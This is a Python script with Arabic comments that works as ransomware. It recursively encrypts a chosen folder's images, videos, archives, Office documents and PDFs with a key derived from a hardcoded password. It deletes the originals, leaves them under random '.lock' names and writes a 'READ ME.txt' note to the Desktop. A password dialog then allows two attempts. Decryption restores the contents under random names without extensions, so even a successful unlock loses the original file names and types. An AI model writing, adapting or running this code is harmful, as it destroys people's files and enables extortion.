import os
import base64
import hashlib
import random
import string
from cryptography.fernet import Fernet
from pathlib import Path
from tkinter import Tk, simpledialog, messagebox

# ---------------- إعدادات ----------------
# الرمز مخزن مشفر (hash) داخل الكود
# لتغييره، ضع الرمز الجديد داخل generate_password_hash() ثم أعد تشغيل السكربت
def generate_password_hash(password: str):
    return hashlib.sha256(password.encode()).hexdigest()

# هنا ضع الرمز الصحيح الذي تريد استخدامه
HASHED_PASSWORD = generate_password_hash("12345")  # مثال على الرمز

MESSAGE = "هنا نص الرسالة التي تظهر في READ ME.txt"  # نص قابل للتعديل

# امتدادات الملفات
EXTENSIONS = [
    # الصور
    '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff', '.webp',
    # الفيديو
    '.mp4', '.mov', '.avi', '.mkv', '.flv', '.wmv',
    # الملفات المضغوطة
    '.zip', '.rar', '.7z', '.tar', '.gz',
    # ملفات الأوفيس
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    # PDF
    '.pdf'
]

# بصمة الملفات المشفرة
FILE_SIGNATURE = b"LOCK"

# ---------------- توليد مفتاح Fernet من الرمز ----------------
def generate_key_from_password(password: str):
    hashed = hashlib.sha256(password.encode()).digest()
    return base64.urlsafe_b64encode(hashed)

# ---------------- إنشاء READ ME ----------------
def create_readme(message: str):
    desktop = Path.home() / "Desktop"
    readme_path = desktop / "READ ME.txt"
    with open(readme_path, 'w', encoding='utf-8') as f:
        f.write(message)

# ---------------- توليد اسم ملف عشوائي ----------------
def random_filename(ext=".lock"):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(12)) + ext

# ---------------- تشفير الملفات ----------------
def encrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                path = os.path.join(root, file)
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    # إضافة البصمة
                    data = FILE_SIGNATURE + data
                    encrypted_data = fernet.encrypt(data)
                    new_name = os.path.join(root, random_filename())
                    with open(new_name, 'wb') as f:
                        f.write(encrypted_data)
                    os.remove(path)
                except Exception as e:
                    print(f"خطأ في الملف {file}: {e}")

# ---------------- فك التشفير ----------------
def decrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            path = os.path.join(root, file)
            try:
                with open(path, 'rb') as f:
                    data = f.read()
                decrypted_data = fernet.decrypt(data)
                # التحقق من البصمة
                if decrypted_data.startswith(FILE_SIGNATURE):
                    decrypted_data = decrypted_data[len(FILE_SIGNATURE):]
                else:
                    continue  # إذا لم توجد البصمة، تخطي
                original_name = os.path.join(root, random_filename(ext=""))  # يمكن استعادة اسم عشوائي آخر
                with open(original_name, 'wb') as f:
                    f.write(decrypted_data)
                os.remove(path)
            except Exception as e:
                print(f"خطأ في الملف {file}: {e}")

# ---------------- نافذة إدخال الرمز ----------------
def request_password_gui():
    root = Tk()
    root.withdraw()
    pw = simpledialog.askstring("Password Required", "أدخل الرمز لفك التشفير:", show='*')
    root.destroy()
    return pw

# ---------------- البرنامج الرئيسي ----------------
def main():
    directory = input("أدخل مسار المجلد: ")
    create_readme(MESSAGE)
    key = generate_key_from_password("12345")  # نفس الرمز الافتراضي للتشفير
    encrypt_files(directory, key)
    print("تم التشفير! لفك التشفير، أدخل الرمز الصحيح.")

    attempts = 0
    max_attempts = 2
    while attempts < max_attempts:
        pw = request_password_gui()
        if pw and generate_password_hash(pw) == HASHED_PASSWORD:
            print("الرمز صحيح! سيتم فك التشفير الآن.")
            key = generate_key_from_password(pw)
            decrypt_files(directory, key)
            messagebox.showinfo("Success", "تم فك التشفير بنجاح!")
            break
        else:
            attempts += 1
            messagebox.showerror("Error", f"رمز خاطئ! محاولات متبقية: {max_attempts - attempts}")
    if attempts >= max_attempts:
        messagebox.showerror("Locked", "تم تجاوز الحد المسموح من المحاولات. تم قفل العملية!")

if __name__ == "__main__":
    main()